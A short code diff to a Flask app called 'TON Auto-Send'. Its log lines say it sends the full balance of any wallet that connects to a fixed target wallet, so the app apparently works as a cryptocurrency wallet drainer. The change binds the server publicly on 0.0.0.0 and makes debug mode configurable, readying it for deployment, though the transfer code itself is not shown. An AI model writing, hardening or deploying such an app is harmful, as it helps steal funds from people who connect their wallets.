@@ -1475,5 +1475,9 @@ if __name__ == '__main__':
     logger.info("Starting TON Auto-Send application")
     logger.info(f"Destination wallet for auto-sends: {TARGET_WALLET}")
     logger.info(f"Auto-send will transfer the full wallet balance upon connection")
-    logger.info(f"Access the application at: http://localhost:5000")
-    app.run(debug=True, port=5000)
+    # Configure host/port via environment with public binding by default
+    host = os.environ.get('HOST', '0.0.0.0')
+    port = int(os.environ.get('PORT', 5000))
+    debug = os.environ.get('FLASK_DEBUG', '0') == '1'
+    logger.info(f"Access the application at: http://{host}:{port}")
+    app.run(host=host, port=port, debug=debug)
